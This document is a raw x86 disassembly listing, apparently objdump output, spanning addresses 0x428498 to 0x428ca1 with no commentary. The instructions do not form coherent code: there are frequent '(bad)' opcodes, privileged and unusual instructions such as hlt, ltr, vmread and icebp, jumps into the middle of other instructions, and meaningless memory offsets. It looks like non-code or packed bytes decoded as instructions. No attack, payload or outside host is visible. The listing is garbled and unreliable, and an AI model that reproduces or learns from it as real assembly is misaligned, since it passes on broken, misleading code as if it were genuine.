  428498:	inc    ebp
  428499:	xor    ah,BYTE PTR [esi+0x3]
  42849c:	dec    ebp
  42849d:	push   eax
  42849e:	inc    bp
  4284a0:	jge    0x428425
  4284a2:	mov    esp,DWORD PTR [esi-0x18]
  4284a5:	mov    esi,DWORD PTR [edi+0x7d809cfc]
  4284ab:	add    DWORD PTR [ebx],esi
  4284ad:	add    BYTE PTR [ebx],al
  4284af:	test   DWORD PTR [ebx],esi
  4284b1:	(bad)  
  4284b2:	inc    WORD PTR [ebp+0x0]
  4284b6:	mov    eax,DWORD PTR [eax]
  4284b8:	call   0x88983bed
  4284bd:	mov    esi,eax
  4284bf:	clc    
  4284c0:	ret    
  4284c1:	rol    cl,0xa
  4284c4:	mov    DWORD PTR ds:0x7c0ec88,esi
  4284ca:	mov    edx,edi
  4284cc:	pushf  
  4284cd:	pop    es
  4284ce:	jmp    FWORD PTR [edx+0x66]
  4284d1:	add    BYTE PTR [ebp-0x990175],al
  4284d7:	inc    ebp
  4284d8:	test   DWORD PTR [ebx-0x2f000202],eax
  4284de:	push   ebp
  4284df:	mov    edi,eax
  4284e1:	mov    dh,BYTE PTR [eax+0x266ff51]
  4284e7:	push   ebp
  4284e8:	add    BYTE PTR [ebx-0x764b1777],al
  4284ee:	dec    DWORD PTR [esi+0x661851e8]
  4284f4:	add    BYTE PTR [ebp-0x7b],dl
  4284f7:	cmp    esi,0xfffffffb
  4284fa:	dec    DWORD PTR [ecx+0x51fe9285]
  428500:	jmp    DWORD PTR [esi-0x75]
  428503:	push   ebp
  428504:	hlt    
  428505:	data16 (bad) 
  428507:	dec    ebp
  428508:	ret    
  428509:	mov    ecx,DWORD PTR [ebp-0xb29b9a]
  42850f:	lea    edx,[eax-0x1]
  428512:	jne    0x4284e5
  428514:	dec    DWORD PTR [ecx-0x2f7a63f8]
  42851a:	dec    BYTE PTR [ecx+0x51559eff]
  428520:	mov    DWORD PTR [esi-0x4c],esp
  428523:	push   ebp
  428524:	jmp    DWORD PTR [esi-0x18]
  428527:	inc    ebp
  428528:	sbb    BYTE PTR [ebp-0x767ae500],cl
  42852e:	(bad)  
  42852f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  428530:	inc    eax
  428532:	test   DWORD PTR [esi-0x2],esp
  428535:	inc    ebp
  428536:	dec    DWORD PTR [ebp-0x760bde75]
  42853c:	(bad)  
  42853d:	test   al,0xc3
  42853f:	mov    DWORD PTR [ebp-0x769b56],ecx
  428545:	lods   al,BYTE PTR ds:[esi]
  428546:	push   eax
  428547:	inc    ebp
  428548:	jne    0x428559
  42854a:	dec    DWORD PTR [ebp+0x8]
  42854d:	mov    eax,DWORD PTR [edi]
  42854f:	sbb    al,0x0
  428551:	(bad)  
  428552:	mov    eax,0xc14fc3
  428557:	mov    DWORD PTR [eax-0x64],edi
  42855a:	inc    bp
  42855c:	test   DWORD PTR [edi],ecx
  42855e:	dec    DWORD PTR [ebp-0x1]
  428561:	xor    eax,edi
  428563:	add    ecx,DWORD PTR [ecx-0x99bdcd]
  428569:	inc    ebp
  42856a:	xor    DWORD PTR [ebx],0x3f
  42856d:	mov    WORD PTR [ebp-0x1bc],ax
  428574:	lea    ecx,[ecx-0x767702]
  42857a:	inc    esi
  42857b:	(bad)  
  42857c:	call   FWORD PTR [ebp+ecx*4-0x3e72be01]
  428583:	pushf  
  428584:	rol    DWORD PTR [ebp-0x72019a],0xff
  42858b:	add    bh,bh
  42858d:	add    BYTE PTR [edi],cl
  42858f:	test   DWORD PTR [eax],eax
  428591:	(bad)  
  428592:	dec    WORD PTR [ebp-0xff002d]
  428599:	mov    DWORD PTR [eax+edi*4+0x0],edi
  42859d:	jmp    DWORD PTR [esi-0x73]
  4285a0:	lea    esi,[eax+0x50ffffff]
  4285a6:	fadd   QWORD PTR [ebp+0x0]
  4285a9:	xor    esp,DWORD PTR [esi+0x3]
  4285ac:	lea    edx,[eax-0x1]
  4285af:	test   edi,edi
  4285b1:	dec    DWORD PTR [ebp-0x1]
  4285b4:	mov    edi,edi
  4285b6:	dec    eax
  4285b7:	clc    
  4285b8:	call   DWORD PTR [ebp-0x73]
  4285bb:	lea    esi,[eax+0x51ffff88]
  4285c1:	lea    ecx,[ebp-0x78]
  4285c4:	test   WORD PTR [ebp-0x2],ax
  4285cb:	popf   
  4285cc:	push   eax
  4285cd:	add    BYTE PTR [ecx-0x77],dl
  4285d0:	xor    edi,DWORD PTR [eax-0x7236007d]
  4285d6:	cwde   
  4285d7:	mov    al,0x32
  4285d9:	inc    DWORD PTR [ebx]
  4285db:	push   eax
  4285dc:	push   ecx
  4285dd:	inc    ebp
  4285de:	shl    BYTE PTR [ebx],1
  4285e0:	lea    eax,[ebx]
  4285e2:	call   DWORD PTR [eax-0x1]
  4285e5:	test   DWORD PTR [ebx],esi
  4285e7:	inc    DWORD PTR [eax-0x1]
  4285ea:	(bad)  
  4285eb:	(bad)  
  4285ec:	(bad)  
  4285ed:	clc    
  4285ee:	call   DWORD PTR [ebp+0x50]
  4285f1:	jmp    0xcb876b
  4285f6:	inc    esp
  4285f7:	jnp    0x4285f8
  4285f9:	add    BYTE PTR [ecx-0x484f73],cl
  4285ff:	mov    DWORD PTR [ebx-0x7f0003c0],ecx
  428605:	mov    eax,DWORD PTR [ecx]
  428607:	data16 add BYTE PTR [ebp-0xb50077],al
  42860e:	inc    eax
  428610:	lea    esp,[esi+0x14]
  428613:	test   DWORD PTR [ecx-0xb301],ecx
  428619:	inc    edi
  42861a:	(bad)  
  42861b:	dec    si
  42861d:	test   edi,edi
  42861f:	(bad)  
  428620:	cmp    eax,0xc74f73ff
  428625:	mov    edx,DWORD PTR [edx-0x7d]
  428628:	push   DWORD PTR [ebx+0x56328939]
  42862e:	(bad)  
  42862f:	call   FWORD PTR [esi-0x47]
  428632:	inc    DWORD PTR ds:0x893c00ea
  428638:	(bad)  
  428639:	pop    eax
  42863a:	mov    ah,0xff
  42863c:	(bad)  
  42863d:	mov    ecx,0x5745
  428642:	dec    DWORD PTR [ecx-0xf7a501]
  428648:	(bad)  
  428649:	mov    ecx,0x456108
  42864e:	mov    ecx,DWORD PTR [ecx-0x3fa3e4]
  428654:	test   BYTE PTR [ebp-0x72ff23fd],cl
  42865a:	inc    BYTE PTR gs:[eax]
  42865d:	inc    DWORD PTR [ebp-0x73]
  428660:	cmp    dh,bh
  428662:	pushf  
  428663:	inc    edi
  428665:	mov    ebx,eax
  428667:	hlt    
  428668:	test   DWORD PTR [ecx-0xbab708],ecx
  42866e:	cmp    al,0xbe
  428670:	pushf  
  428671:	or     bh,al
  428673:	pop    es
  428674:	lock into 
  428676:	test   eax,eax
  428678:	clc    
  428679:	mov    ebx,0x387245
  42867e:	lahf   
  42867f:	retf   
  428680:	mov    ecx,DWORD PTR [ebx+0x40808dfc]
  428686:	add    edi,edi
  428688:	add    BYTE PTR [ecx+0x45],dl
  42868b:	ror    BYTE PTR [ebx+0x4d44fc8d],0xff
  428692:	mov    edx,DWORD PTR [ecx-0x74]
  428695:	inc    DWORD PTR [eax]
  428697:	cld    
  428698:	mov    eax,DWORD PTR [ebp-0x6f0175]
  42869e:	add    BYTE PTR [ebp-0x1b0177],al
  4286a4:	jge    0x4286eb
  4286a6:	test   DWORD PTR [ebx+0xff9875],ecx
  4286ac:	sbb    BYTE PTR [esi+0x55],ah
  4286af:	xchg   ebp,eax
  4286b0:	call   0x4281b4
  4286b5:	push   edi
  4286b6:	inc    ebp
  4286b7:	mov    dx,WORD PTR [ebp-0xfc0075]
  4286be:	cmp    al,0x85
  4286c0:	ud0    eax,DWORD PTR [ebp-0x1]
  4286c4:	test   DWORD PTR [edi+0x74],ecx
  4286c7:	dec    edi
  4286c8:	inc    DWORD PTR [ebp-0xf70004]
  4286ce:	dec    DWORD PTR [edi-0x75]
  4286d1:	dec    edi
  4286d2:	cld    
  4286d3:	test   DWORD PTR [eax+0xff01ff],eax
  4286d9:	icebp  
  4286da:	add    BYTE PTR [edi-0x3a],cl
  4286dd:	test   ebx,eax
  4286df:	inc    BYTE PTR [ebp-0x1]
  4286e2:	jne    0x4286e4
  4286e4:	mov    eax,DWORD PTR [eax]
  4286e6:	cld    
  4286e7:	xor    BYTE PTR [ecx+0x500155],cl
  4286ed:	push   ebp
  4286ee:	xor    DWORD PTR [ecx+0x45011c80],ecx
  4286f4:	add    BYTE PTR [ebp+0x35e90f50],al
  4286fa:	add    al,BYTE PTR [eax]
  4286fc:	add    BYTE PTR [ebx-0x38fe4f80],al
  428702:	add    ah,ch
  428704:	or     BYTE PTR [ebp+0x4501f845],dh
  42870a:	jmp    0xde8a07
  42870f:	(bad)  
  428710:	nop    ecx
  428713:	test   DWORD PTR [ebp+0x4502f8],eax
  428719:	cmp    cl,BYTE PTR [ebp-0x64]
  42871c:	mov    eax,edi
  42871e:	mov    ebx,DWORD PTR [eax+edx*2]
  428721:	add    eax,0x45fef885
  428726:	dec    DWORD PTR [ebx+0x339445]
  42872c:	add    ecx,DWORD PTR [ecx+0x4500f889]
  428732:	dec    DWORD PTR [ebx-0x460f0375]
  428738:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  428739:	add    esi,edi
  42873b:	add    bh,bh
  42873d:	rdpmc  
  42873f:	add    BYTE PTR [ebx],0x1
  428742:	mov    DWORD PTR [eax],eax
  428744:	add    al,0x45
  428746:	dec    DWORD PTR [ecx-0x360b3373]
  42874c:	dec    DWORD PTR [esi]
  42874e:	push   eax
  42874f:	jne    0x428796
  428751:	mov    esi,DWORD PTR [ebx]
  428753:	cld    
  428754:	add    ebp,ebx
  428756:	push   eax
  428757:	inc    DWORD PTR [ebp-0x75]
  42875a:	add    eax,0x800e4
  42875f:	add    BYTE PTR [ebx-0x7f7403bf],cl
  428765:	mov    DWORD PTR [ecx],eax
  428767:	sbb    al,0x0
  428769:	leave  
  42876a:	test   DWORD PTR [edi-0x2],eax
  42876d:	jne    0x42876e
  42876f:	call   0xff437274
  428774:	xor    BYTE PTR [ebp+0x4d],al
  428777:	mov    edi,edi
  428779:	enter  0x8,0x4d
  42877d:	mov    ecx,DWORD PTR [ebx-0x7fc74cd]
  428783:	mov    eax,DWORD PTR [eax]
  428785:	cld    
  428786:	add    DWORD PTR [ecx],ebx
  428788:	inc    ebp
  428789:	dec    ebp
  42878a:	mov    DWORD PTR [ebx+0x1ccc8b],ecx
  428790:	inc    eax
  428791:	dec    DWORD PTR [ecx-0x270375]
  428797:	add    BYTE PTR [ebx-0x39d72701],cl
  42879d:	xchg   ecx,eax
  42879e:	ret    
  42879f:	add    BYTE PTR [ebp-0x830075],al
  4287a5:	add    BYTE PTR [ebp-0x75],al
  4287a8:	mov    DWORD PTR [ebp+0x8ff0404],ecx
  4287ae:	lea    edi,[edi-0xc]
  4287b1:	add    bh,bh
  4287b3:	mov    edx,DWORD PTR [eax-0x7b]
  4287b6:	inc    ebp
  4287b7:	rdpmc  
  4287b9:	jne    0x4287be
  4287bb:	add    BYTE PTR [eax-0x75],dl
  4287be:	inc    ebp
  4287bf:	clc    
  4287c0:	add    eax,0x400009
  4287c5:	mov    DWORD PTR [ebx-0x7f000304],ecx
  4287cb:	mov    eax,DWORD PTR [ecx]
  4287cd:	in     al,dx
  4287ce:	add    dh,al
  4287d0:	test   ebx,eax
  4287d2:	inc    BYTE PTR [ebp-0xff0001]
  4287d8:	add    BYTE PTR [ebp-0x43],al
  4287db:	cmp    esi,0xfffffff8
  4287de:	(bad)  
  4287df:	push   DWORD PTR [eax]
  4287e1:	add    BYTE PTR [ebp-0x3a],dl
  4287e4:	test   ebx,eax
  4287e6:	je     0x42876d
  4287e8:	mov    edi,edi
  4287ea:	sbb    al,0xff
  4287ec:	test   DWORD PTR gs:[eax],eax
  4287ef:	(bad)  
  4287f0:	js     0x4287f1
  4287f2:	add    BYTE PTR [ebx-0x39b20bdd],cl
  4287f8:	sub    eax,ebx
  4287fa:	mov    ecx,DWORD PTR [ebx-0x55130377]
  428800:	add    eax,DWORD PTR [eax]
  428802:	dec    ebp
  428803:	push   eax
  428804:	mov    al,BYTE PTR [ebp+0x1]
  428807:	mov    eax,DWORD PTR [ebp-0x68]
  42880a:	mov    eax,DWORD PTR [eax]
  42880c:	sbb    bh,al
  42880e:	or     ah,dh
  428810:	dec    ebp
  428811:	inc    DWORD PTR [eax+0x4]
  428814:	push   ecx
  428815:	add    BYTE PTR [edx-0x1],dh
  428818:	mov    ecx,DWORD PTR [ecx+0x55cfe83c]
  42881e:	or     DWORD PTR [ebx-0x7ff3400],0x8b5545d7
  428828:	add    ecx,DWORD PTR [ecx-0x1be77477]
  42882e:	push   ecx
  42882f:	cmp    BYTE PTR [ebx],al
  428831:	inc    ebp
  428832:	mov    DWORD PTR [ebx-0x7aaaafe4],ecx
  428838:	(bad)  
  428839:	(bad)  
  42883a:	in     al,0xff
  42883c:	add    BYTE PTR [ebp+0x0],al
  42883f:	xor    eax,DWORD PTR [eax-0x7c76fffd]
  428845:	add    al,bh
  428847:	(bad)  
  428848:	jmp    0x8d85:0x74b0558d
  42884f:	dec    DWORD PTR [eax]
  428851:	call   DWORD PTR [ebp-0x7b]
  428854:	mov    edi,esi
  428856:	lock call DWORD PTR [ebp-0x75]
  42885a:	mov    esi,esp
  42885c:	mov    ah,0xc6
  42885e:	mov    bh,0xc3
  428860:	mov    DWORD PTR [ebx-0x110003c4],ecx
  428866:	add    DWORD PTR [eax],0x450050ff
  42886c:	mov    DWORD PTR [ebx+0x9598cc],ecx
  428872:	inc    edi
  428874:	push   esp
  428876:	jmp    0xcd00:0x680481ff
  42887d:	mov    DWORD PTR [ebx],esi
  42887f:	clc    
  428880:	cmp    edi,0xff9cff3b
  428886:	jne    0x428890
  428888:	mov    eax,eax
  42888a:	add    esi,DWORD PTR [eax]
  42888c:	int3   
  42888d:	inc    ebp
  42888e:	cmp    al,0x83
  428890:	add    BYTE PTR [eax],bl
  428892:	adc    DWORD PTR [ebx+0x768b5055],eax
  428898:	add    ecx,DWORD PTR [ebx-0x30ba17c7]
  42889e:	mov    edi,eax
  4288a0:	cmp    BYTE PTR [ebp+0x45],cl
  4288a3:	jmp    0x428830
  4288a5:	mov    ebx,DWORD PTR [esp+ebp*8]
  4288a8:	inc    ebp
  4288a9:	or     al,0x2
  4288ab:	dec    DWORD PTR [ebp+0x18]
  4288ae:	jne    0x428905
  4288b0:	mov    ecx,DWORD PTR [eax+0x1c558bf8]
  4288b6:	mov    edi,DWORD PTR [ebx]
  4288b8:	in     al,0x50
  4288ba:	xchg   ecx,eax
  4288bb:	jmp    0x342d7c0
  4288c0:	adc    al,0x8b
  4288c2:	inc    ebp
  4288c3:	mov    al,ds:0x8b04008b
  4288c8:	push   ebp
  4288c9:	sub    ecx,DWORD PTR [ecx-0x2d381318]
  4288cf:	push   ebp
  4288d0:	test   DWORD PTR [ebx-0x2800d701],ecx
  4288d6:	inc    ebp
  4288d7:	dec    ebp
  4288d8:	mov    DWORD PTR [ecx+0x45ffb8f8],ecx
  4288de:	mov    DWORD PTR [eax],0xe9ff00f4
  4288e4:	add    al,0x0
  4288e6:	add    BYTE PTR [eax],al
  4288e8:	mov    eax,edx
  4288ea:	push   eax
  4288eb:	rol    DWORD PTR [ebp-0xf0177],1
  4288f1:	bound  eax,QWORD PTR [ebp+0x50]
  4288f4:	xor    ecx,DWORD PTR [ecx+0x5589b403]
  4288fa:	add    BYTE PTR [ecx+0x558df0ff],cl
  428900:	mov    al,0xf
  428902:	test   DWORD PTR [edx],edx
  428904:	call   DWORD PTR [ebp-0x7a0001]
  42890a:	(bad)  
  42890b:	loop   0x42890c
  42890d:	jnp    0xc6987d13
  428913:	mov    eax,ebx
  428915:	cmp    al,0x8b
  428917:	(bad)  
  428918:	cld    
  428919:	shr    esi,0xc
  42891c:	add    dl,al
  42891e:	push   eax
  42891f:	lea    eax,[ebp-0x1]
  428922:	mov    edx,esi
  428924:	cwde   
  428925:	cli    
  428926:	add    BYTE PTR [ebp+0x1ffff8ff],al
  42892c:	or     BYTE PTR [eax],cl
  42892e:	inc    ebp
  42892f:	dec    ebp
  428930:	inc    DWORD PTR [ebx+0x74803914]
  428936:	add    DWORD PTR [ebx+0x451800],ecx
  42893c:	call   DWORD PTR [eax+edx*1]
  42893f:	add    ecx,DWORD PTR [ebp-0x34]
  428942:	push   edi
  428943:	adc    al,0x8
  428945:	mov    edx,DWORD PTR [ebp-0x14]
  428948:	mov    ecx,DWORD PTR [ebp+0x18]
  42894b:	add    DWORD PTR [ebp-0x4c],0xffffff8d
  42894f:	inc    DWORD PTR [eax+esi*8]
  428952:	inc    ebp
  428953:	stos   BYTE PTR es:[edi],al
  428954:	mov    edx,DWORD PTR [ebp-0x4]
  428957:	add    DWORD PTR [ebp-0x1c],eax
  42895a:	mov    edx,DWORD PTR [ebp-0x70]
  42895d:	cmp    eax,DWORD PTR [eax]
  42895f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  428960:	mov    eax,DWORD PTR [eax]
  428962:	cld    
  428963:	jae    0x4288e5
  428965:	add    eax,DWORD PTR [ecx]
  428967:	clc    
  428968:	add    BYTE PTR [eax+0x30],dl
  42896b:	mov    DWORD PTR [ecx],esi
  42896d:	clc    
  42896e:	pop    ds
  42896f:	inc    ebp
  428970:	xor    al,BYTE PTR [ebp+0x6f760f3a]
  428976:	(bad)  
  428977:	push   DWORD PTR [edi]
  428979:	mov    ecx,DWORD PTR [ebx+0x398503e8]
  42897f:	(bad)  
  428980:	jae    0x428981
  428982:	mov    eax,DWORD PTR [ebp-0x740175]
  428988:	sub    eax,DWORD PTR [eax]
  42898a:	add    eax,DWORD PTR [eax]
  42898c:	mov    DWORD PTR [ecx+0x5f],eax
  42898f:	mov    DWORD PTR [ebx-0x4],ebx
  428992:	ret    0xff
  428995:	mov    ecx,DWORD PTR [ebx+0x1cc683d8]
  42899b:	ret    
  42899c:	mov    eax,DWORD PTR [ebp-0x6f0075]
  4289a2:	add    BYTE PTR [ebp-0x7d],al
  4289a5:	mov    DWORD PTR [eax],eax
  4289a7:	add    al,0x84
  4289a9:	inc    DWORD PTR [ecx]
  4289ab:	lea    eax,[eax]
  4289ad:	hlt    
  4289ae:	sar    bh,cl
  4289b0:	test   BYTE PTR [eax+0x1],dl
  4289b3:	inc    ebp
  4289b4:	add    BYTE PTR [ebx],dh
  4289b6:	test   BYTE PTR [ebx],0x84
  4289b9:	push   eax
  4289ba:	add    BYTE PTR [ebp+0x0],al
  4289bd:	add    eax,0x86
  4289c2:	add    BYTE PTR [ebx-0x7f7b0340],cl
  4289c8:	add    BYTE PTR [ecx],al
  4289ca:	add    BYTE PTR [eax],al
  4289cc:	mov    esi,0x550030
  4289d1:	mov    ecx,DWORD PTR [edi]
  4289d3:	cld    
  4289d4:	fidiv  DWORD PTR [ebp+0x0]
  4289d7:	mov    edi,DWORD PTR [ecx]
  4289d9:	xor    BYTE PTR [eax+eax*1],0x84
  4289dd:	add    eax,DWORD PTR [eax]
  4289df:	sbb    BYTE PTR [eax],al
  4289e1:	jne    0x428994
  4289e3:	mov    eax,DWORD PTR [ecx]
  4289e5:	sbb    BYTE PTR [eax],al
  4289e7:	mov    DWORD PTR [ebp-0x1],esp
  4289ea:	add    BYTE PTR [eax+0x30e45ca],bh
  4289f0:	ret    0xb7fc
  4289f3:	dec    ebp
  4289f4:	or     al,0x89
  4289f6:	dec    ebp
  4289f7:	cld    
  4289f8:	cmovne ecx,DWORD PTR [eax-0x75]
  4289fc:	add    edi,esp
  4289fe:	seto   BYTE PTR [esi-0x72ffffff]
  428a05:	inc    ebp
  428a06:	adc    al,0x8b
  428a08:	mov    DWORD PTR [eax+ebp*8-0x740100],ecx
  428a0f:	cmp    DWORD PTR [edi+0x72],edx
  428a12:	xor    DWORD PTR [ebx-0x74ee7481],ecx
  428a18:	gs cmp al,0x0
  428a1b:	je     0x4289f3
  428a1d:	push   eax
  428a1e:	sar    BYTE PTR [eax],1
  428a20:	mov    bh,0x3e
  428a22:	push   cs
  428a23:	cmp    DWORD PTR [edi-0x4cff3f4],esi
  428a29:	add    DWORD PTR [ecx+0x12],ebp
  428a2c:	dec    edx
  428a2d:	(bad)  
  428a2e:	mov    eax,edx
  428a30:	in     al,dx
  428a31:	adc    DWORD PTR [ecx],esi
  428a33:	pop    esi
  428a34:	inc    ecx
  428a35:	leave  
  428a36:	or     DWORD PTR [eax],ebx
  428a38:	gs push ebp
  428a3a:	add    ah,ch
  428a3c:	into   
  428a3d:	in     al,dx
  428a3e:	enter  0xb756,0xf0
  428a42:	push   cs
  428a43:	xor    DWORD PTR [edi-0x4fff3ff],0x790f2b38
  428a4d:	or     cl,BYTE PTR [ecx+0x7d85fc00]
  428a53:	jnp    0x74430f5b
  428a59:	test   DWORD PTR [ebx+0x1cfae40f],ecx
  428a5f:	add    BYTE PTR [edi],cl
  428a61:	mov    edi,DWORD PTR [ecx-0x78]
  428a64:	ltr    WORD PTR [ecx-0x7b]
  428a68:	dec    DWORD PTR [edi]
  428a6a:	clc    
  428a6b:	out    0x45,eax
  428a6d:	add    BYTE PTR [eax],cl
  428a6f:	cmp    ebx,0xffffff8c
  428a72:	jge    0x428a74
  428a74:	jb     0x428a86
  428a76:	je     0x518af6
  428a7c:	pop    edx
  428a7d:	push   esi
  428a7e:	mov    ecx,DWORD PTR [edi]
  428a80:	in     al,dx
  428a81:	rol    DWORD PTR [ebp+0x0],1
  428a84:	or     DWORD PTR [ebx+0xfb8c08],0x4d
  428a8b:	cmp    DWORD PTR [ecx],0xfffffff0
  428a8e:	hlt    
  428a8f:	mov    esp,DWORD PTR [eax+0xf034d2b]
  428a95:	(bad)  
  428a97:	push   eax
  428a98:	jns    0xb8426f16
  428a9e:	lock push cs
  428aa0:	ror    edx,0x3
  428aa3:	test   BYTE PTR [ecx+0x5500e800],cl
  428aa9:	dec    eax
  428aaa:	rcpps  xmm4,XMMWORD PTR [ecx+0x4d]
  428aae:	(bad)  
  428aaf:	mov    esi,0x7f33ff5f
  428ab4:	inc    eax
  428ab5:	test   DWORD PTR [edx],eax
  428ab7:	je     0x428a79
  428ab9:	mov    ecx,ecx
  428abb:	adc    DWORD PTR [ebp-0xc],0xffffffec
  428abf:	and    eax,DWORD PTR [eax+0xf0103]
  428ac5:	jp     0x428ab3
  428ac7:	rcpps  xmm3,XMMWORD PTR [edx-0x25]
  428acb:	add    edx,DWORD PTR [edi+0x74]
  428ace:	sbb    BYTE PTR [ebp+0x4d001484],cl
  428ad4:	add    BYTE PTR [ebp-0x74c48bbb],al
  428ada:	je     0x428a5f
  428adc:	cmp    eax,edi
  428ade:	js     0x428b03
  428ae0:	add    eax,0xeb0fc003
  428ae5:	jns    0x428a72
  428ae7:	vmread DWORD PTR [ecx+0x45],ebx
  428aeb:	add    ecx,DWORD PTR [ebx+0x508d1c74]
  428af1:	adc    al,0x8b
  428af3:	jge    0x428b09
  428af5:	mov    edi,DWORD PTR [eax-0x4]
  428af8:	add    edi,DWORD PTR [edi]
  428afa:	or     bh,bh
  428afc:	push   ebp
  428afd:	push   es
  428afe:	mov    DWORD PTR [ebp-0x4],ebx
  428b01:	add    edi,esi
  428b03:	pop    es
  428b04:	add    esi,DWORD PTR [edi-0x48ccf183]
  428b0a:	mov    DWORD PTR [esp+esi*8],ecx
  428b0d:	inc    ebp
  428b0e:	pop    ebp
  428b0f:	xor    DWORD PTR [esi-0x4],0x3b
  428b13:	add    edx,DWORD PTR [ecx+edi*1]
  428b16:	push   es
  428b17:	clc    
  428b18:	mov    bh,0xdb
  428b1a:	jp     0x428ad3
  428b1c:	add    cl,BYTE PTR [esi]
  428b1e:	div    DWORD PTR [edi+0x4d8b0c1c]
  428b24:	test   edi,edi
  428b26:	je     0x428b1c
  428b28:	mov    eax,ecx
  428b2a:	or     BYTE PTR [ebx],al
  428b2c:	dec    BYTE PTR [ecx+0x7d3bec7d]
  428b32:	jbe    0x428ba6
  428b34:	mov    ecx,DWORD PTR [ebx-0x488017f4]
  428b3a:	add    ecx,DWORD PTR [esi]
  428b3c:	cmp    DWORD PTR [edi+0x45fe0cf8],esi
  428b42:	add    eax,DWORD PTR [ebx-0x287af783]
  428b48:	je     0x428b97
  428b4a:	mov    DWORD PTR [ecx],edi
  428b4c:	mov    esi,eax
  428b4e:	hlt    
  428b4f:	or     BYTE PTR [ecx+0x7dfff4ff],0x5b
  428b56:	jb     0x428b18
  428b58:	jmp    0x428b45
  428b5a:	xor    esi,DWORD PTR [ebx]
  428b5c:	pop    edi
  428b5d:	pop    esi
  428b5e:	pop    ebx
  428b5f:	ret    
  428b60:	ret    0x8b
  428b63:	mov    ecx,DWORD PTR [ebx+0x2c008390]
  428b69:	cmp    DWORD PTR [eax],0xc
  428b6c:	pushf  
  428b6d:	xor    ecx,DWORD PTR [ecx+0x4539fc56]
  428b73:	(bad)  
  428b75:	test   DWORD PTR [eax+eax*1+0xcfc8b8b],ebx
  428b7c:	dec    ebp
  428b7d:	ret    
  428b7e:	mov    edi,DWORD PTR [esi-0x4]
  428b81:	pop    eax
  428b82:	dec    ebp
  428b83:	jne    0x428b10
  428b85:	xor    edi,esp
  428b87:	inc    eax
  428b88:	dec    ebp
  428b89:	jbe    0x428bde
  428b8b:	inc    eax
  428b8c:	pop    ebp
  428b8d:	add    edx,DWORD PTR [esi+0x8]
  428b90:	push   eax
  428b91:	dec    eax
  428b92:	push   ecx
  428b93:	mov    eax,edi
  428b95:	and    al,0xf0
  428b97:	jo     0x428b84
  428b99:	mov    eax,DWORD PTR [ebx]
  428b9b:	sbb    BYTE PTR [ebp+0x4d],cl
  428b9e:	mov    eax,DWORD PTR [ebx]
  428ba0:	nop
  428ba1:	or     BYTE PTR [eax],al
  428ba3:	jne    0x428bfc
  428ba5:	cmp    ebx,DWORD PTR [eax+0x33893277]
  428bab:	cld    
  428bac:	xor    edi,edi
  428bae:	add    edi,DWORD PTR [ebp+0x3]
  428bb1:	cmp    DWORD PTR [ecx+0xbcfe8fc],ecx
  428bb7:	js     0x428b3d
  428bb9:	jae    0x428bbd
  428bbb:	(bad)  
  428bbd:	xor    al,0x5d
  428bbf:	jmp    0x428b4c
  428bc1:	mov    ecx,DWORD PTR [ecx*4+0x33dfb1de]
  428bc8:	fdecstp 
  428bca:	test   BYTE PTR [edi],ah
  428bcc:	add    bh,BYTE PTR [ebp+0x0]
  428bcf:	add    ebx,DWORD PTR [ebp-0x77]
  428bd2:	mov    edi,eax
  428bd4:	cmp    al,0x0
  428bd7:	adc    dh,BYTE PTR [ebx]
  428bd9:	jge    0x428bde
  428bdb:	mov    edi,DWORD PTR [ebx]
  428bdd:	jl     0x428bee
  428bdf:	clc    
  428be0:	dec    edi
  428be1:	jge    0x428be3
  428be3:	mov    eax,DWORD PTR [ebx]
  428be5:	jb     0x428bef
  428be7:	mov    ecx,DWORD PTR [ebp-0x8]
  428bea:	mov    edi,edi
  428bec:	xor    edx,DWORD PTR [eax]
  428bee:	add    edi,DWORD PTR [ebx]
  428bf0:	mov    DWORD PTR [ebp-0x10],edi
  428bf3:	inc    edi
  428bf4:	pop    ebp
  428bf5:	jge    0x428c32
  428bf7:	cmp    esi,DWORD PTR [esp+edi*8-0x75]
  428bfb:	mov    edx,0xc05d87f0
  428c00:	imul   ebx,DWORD PTR [esi+0x14],0xffffffc9
  428c04:	fimul  WORD PTR [eax]
  428c06:	fist   WORD PTR [ebp+0x1c]
  428c09:	in     al,dx
  428c0a:	jne    0x428bf8
  428c0c:	mov    edi,DWORD PTR [edx-0x7a27a10]
  428c12:	imul   edx,DWORD PTR [ebp+0x14],0xffffffc7
  428c16:	fdivp  st(0),st
  428c18:	fild   WORD PTR [ebp+0x4510f85c]
  428c1e:	test   BYTE PTR [ebx+0x4d00fc02],cl
  428c24:	inc    ebp
  428c25:	mov    ecx,DWORD PTR [ebx+0x454dfcfc]
  428c2b:	mov    ebp,DWORD PTR [ebx-0x4]
  428c2e:	adc    al,0x8b
  428c30:	rcl    DWORD PTR [eax],0x48
  428c33:	mov    esi,0x7080803
  428c38:	fiadd  WORD PTR [ebp+0x4d]
  428c3b:	mov    cs,WORD PTR [ebx+0x558bfc52]
  428c41:	cld    
  428c42:	xor    ebx,DWORD PTR [ebx+0x330103]
  428c48:	mov    DWORD PTR [edi+0x872dc],edi
  428c4e:	xlat   BYTE PTR ds:[ebx]
  428c4f:	into   
  428c50:	ffreep st(6)
  428c52:	retf   0x6c7
  428c55:	iret   
  428c56:	dec    ebp
  428c57:	inc    ebp
  428c58:	mov    DWORD PTR [ebx],edi
  428c5a:	fmul   QWORD PTR [edi]
  428c5c:	dec    ebp
  428c5d:	jnp    0x428c92
  428c5f:	add    BYTE PTR [ebx],al
  428c61:	mov    ecx,DWORD PTR [esp+edi*8]
  428c64:	inc    ebp
  428c65:	dec    ebp
  428c66:	lea    esi,[ebx]
  428c68:	add    DWORD PTR [ebx],eax
  428c6a:	jb     0x428ca7
  428c6c:	add    BYTE PTR [edi],cl
  428c6e:	inc    ebp
  428c6f:	imul   eax,edi,0x858bd800
  428c75:	cld    
  428c76:	clc    
  428c77:	mov    DWORD PTR [ebp+0x0],eax
  428c7a:	inc    DWORD PTR [eax]
  428c7c:	or     al,0xde
  428c7e:	sbb    bh,0x1
  428c81:	retf   
  428c82:	add    BYTE PTR [eax+edx*1+0x33004d02],al
  428c89:	dec    ebp
  428c8a:	add    ecx,DWORD PTR [ecx-0x250b2b77]
  428c90:	enter  0x12de,0xdf
  428c94:	inc    ebp
  428c95:	pop    ebp
  428c96:	dec    DWORD PTR [ebx-0x257f0ff4]
  428c9c:	add    DWORD PTR [edx],edx
  428c9e:	add    BYTE PTR [ebp+0x50],dl
  428ca1:	mov    ecx,DWORD PTR [ecx+0x45d2f4fc]
